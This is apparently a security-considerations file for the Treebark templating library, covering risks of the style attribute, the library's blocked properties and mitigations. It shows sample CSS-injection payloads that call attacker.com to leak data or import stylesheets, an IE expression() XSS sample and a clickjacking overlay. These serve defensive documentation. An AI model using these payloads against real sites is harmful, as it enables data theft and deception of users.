# Security Considerations

## Style Attribute Security Risks

The `style` attribute is currently allowed on all HTML elements in Treebark as a global attribute. While this provides flexibility for styling, there are several security considerations to be aware of:

### Identified Risks

#### 1. CSS Injection via url()
CSS properties that accept URLs (e.g., `background-image`, `background`, `list-style-image`) can be used to:
- **Load external resources** that could track users or exfiltrate data
- **Make cross-origin requests** that could leak information via CSS attribute selectors

**Example:**
```json
{
  "div": {
    "style": "background-image: url(https://attacker.com/track?data=sensitive)",
    "$children": ["Content"]
  }
}
```

#### 2. JavaScript Execution (Legacy Browsers)
While modern browsers block these, older browsers (particularly Internet Explorer) had features that could execute JavaScript through CSS:
- **`expression()`** - IE-specific CSS expression that could run JavaScript
- **`behavior`** property - IE could load and execute HTC (HTML Component) files
- **`-moz-binding`** - Firefox XBL binding that could execute code

**Example:**
```json
{
  "div": {
    "style": "width: expression(alert('XSS'))",
    "$children": ["Content"]
  }
}
```

#### 3. Data Exfiltration
CSS can be used to exfiltrate data through various techniques:
- **Attribute selectors with background images** - Can steal form values, CSRF tokens, etc.
- **Font-face with unicode-range** - Can detect specific characters in text

**Example:**
```css
input[value^="a"] {
  background: url(https://attacker.com/leak?char=a);
}
```

#### 4. UI Redressing
CSS properties like `position`, `z-index`, `opacity`, and `transform` can be used for:
- **Clickjacking** - Overlaying invisible elements over legitimate UI
- **Content hiding** - Hiding warning messages or important information
- **Phishing** - Creating fake login forms over legitimate content

**Example:**
```json
{
  "div": {
    "style": "position: fixed; top: 0; left: 0; z-index: 9999; opacity: 0.01",
    "$children": ["Invisible overlay"]
  }
}
```

#### 5. CSS Imports
The `@import` directive can load external stylesheets, which could:
- Load additional malicious CSS
- Track users
- Potentially bypass Content Security Policy in some configurations

**Example:**
```json
{
  "div": {
    "style": "@import url(https://attacker.com/malicious.css)",
    "$children": ["Content"]
  }
}
```

### Current Behavior

Treebark provides comprehensive security through its design:
- ✅ **Escapes HTML** in interpolated values (prevents `<script>` injection)
- ✅ **Validates tag names** (prevents `<script>` tags)
- ✅ **Validates attribute names** (prevents `onclick`, `onerror`, etc.)
- ✅ **Structured style objects** with whitelist validation (prevents CSS injection)

**Style Attribute Security:**
As of the latest version, Treebark requires the `style` attribute to be a structured object rather than a string. This provides security by design:
- Uses generic property validation (any kebab-case CSS property allowed)
- Blocked dangerous properties: `behavior`, `-moz-binding`
- Values containing `url()` (except data: URIs), `javascript:`, or `@import` are rejected
- Property names must be in kebab-case format (e.g., `"font-size"`, not `"fontSize"`)
- Future-proof: new CSS properties work automatically without code updates

### Recommendations

For applications using Treebark with user-generated content or untrusted data, consider:

1. **Content Security Policy (CSP)**
   - Use `style-src 'self'` to prevent inline styles
   - Or use `style-src 'unsafe-inline'` with nonces

2. **Input Validation**
   - Validate and sanitize style values before passing to Treebark
   - Use an allowlist of safe CSS properties
   - Block or sanitize `url()` values

3. **Avoid User-Controlled Styles**
   - Don't allow users to directly control style attributes
   - Use predefined CSS classes instead
   - If custom styling is needed, validate against an allowlist

4. **Consider CSS Sanitization**
   - Implement a CSS sanitizer if user-controlled styles are necessary
   - Libraries like [sanitize-css](https://www.npmjs.com/package/sanitize-css) or similar can help
   - Block dangerous properties: `behavior`, `-moz-binding`, `expression`
   - Sanitize `url()` values to allow only data URIs or trusted domains

### Safe Usage Examples

**✅ Safe: Hardcoded styles**
```json
{
  "div": {
    "style": "color: red; font-size: 14px",
    "$children": ["Static content"]
  }
}
```

**✅ Safe: Interpolated safe values**
```json
{
  "div": {
    "style": "color: {{color}}; font-size: {{size}}px",
    "$children": ["Content"]
  }
}
```
With validated data: `{ color: "red", size: 14 }`

**⚠️ Risky: User-controlled full style attribute**
```json
{
  "div": {
    "style": "{{userStyle}}",
    "$children": ["Content"]
  }
}
```
If `userStyle` comes from untrusted input, this could be exploited.

### References

- [OWASP CSS Injection](https://owasp.org/www-community/attacks/CSS_Injection)
- [CSS Injection Attacks](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
- [Scriptless Attacks](http://www.segmentationfault.fr/publications/mario_heiderich_-_scriptless_attacks_cutting_edge_xss.pdf)
